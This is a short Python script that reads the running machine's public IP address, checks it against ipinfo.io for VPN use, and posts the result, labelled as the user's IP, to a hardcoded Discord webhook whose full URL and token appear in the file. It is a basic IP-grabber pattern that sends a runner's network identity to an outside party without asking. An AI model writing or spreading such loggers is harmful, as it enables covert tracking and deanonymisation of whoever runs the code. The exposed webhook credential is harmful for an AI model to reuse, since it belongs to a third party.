import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1444092786210111632/x8hPF9-vXrKOy_3QJwZKDFvRCsm_7PzVuH69t_rqczttGBoWIXhlexfu9fvxMbrUeijn"
IPINFO_TOKEN = ""  # Optional: put your ipinfo.io token here for higher limits

def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org")
        response.raise_for_status()
        return response.text.strip()
    except requests.RequestException as e:
        print(f"Error getting IP: {e}")
        return None

def is_vpn_ip(ip):
    headers = {}
    if IPINFO_TOKEN:
        url = f"https://ipinfo.io/{ip}/privacy?token={IPINFO_TOKEN}"
    else:
        url = f"https://ipinfo.io/{ip}/privacy"
    try:
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        data = response.json()
        # ipinfo returns 'vpn': true if it's a VPN
        return data.get("vpn", False)
    except Exception as e:
        print(f"Error checking VPN status: {e}")
        return False  # treat failures as not-VPN

def send_ip_to_discord(ip, is_vpn):
    display_ip = f"{ip} (VPN)" if is_vpn else ip
    embed = {
        "title": "Public IP Address",
        "description": f"User's public IP address: `{display_ip}`",
        "color": 0x00bcd4 if not is_vpn else 0xff1744
    }
    data = {
        "embeds": [embed]
    }
    try:
        result = requests.post(WEBHOOK_URL, json=data)
        result.raise_for_status()
        print("IP sent to Discord successfully.")
    except requests.RequestException as e:
        print(f"Error sending IP to Discord: {e}")

def main():
    ip = get_public_ip()
    if ip:
        vpn = is_vpn_ip(ip)
        send_ip_to_discord(ip, vpn)

if __name__ == "__main__":
    main()
